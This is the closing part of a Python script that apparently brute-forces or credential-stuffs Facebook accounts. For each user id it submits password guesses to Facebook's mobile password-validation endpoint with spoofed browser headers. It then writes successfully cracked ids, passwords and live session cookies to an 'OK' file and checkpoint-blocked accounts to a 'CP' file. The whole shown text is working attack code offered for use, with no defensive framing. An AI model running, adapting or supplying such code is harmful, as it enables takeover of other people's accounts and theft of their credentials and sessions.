			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.9/dialog/oauth/?platform=facebook&client_id=1862952583919182&response_type=token&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221862952583919182%22%2C%22network%22%3A%22facebook%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_7q9rily9%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=public_profile&auth_type=reauthenticate&display=popup h2","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="101", "Google Chrome";v="111", "Not;A=Brand";v="110"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'none','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(Panel.fit(f"""[bold yellow]{idf}|{pw} [bold white]""",style=f"bold red"))
				tree.add(Panel.fit(f"""[bold yellow]{ua} [bold white]""",style=f"bold red"))
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=ses.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				#tree = Tree("")
				#tree.add(f"\r{H2}{idf}|{pw}{P}").add(f"{H}{kuki}{P}")
				#prints(tree)
				tree = Tree(Panel.fit(f"""[bold green]{idf}|{pw} [bold white]""",style=f"bold green"))
				tree.add(Panel.fit(f"[bold green]{ua}[bold white]",style="bold green"))
				tree.add(Panel.fit(f"[bold green]{kuki}[bold white]",style="bold green"))
				prints(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			else:
				continue
		#except Exception as e:print(e)
		except requests.exceptions.ConnectionError:
			time.sleep(30)
	
	loop+=1
		
if __name__=='__main__':
	login()
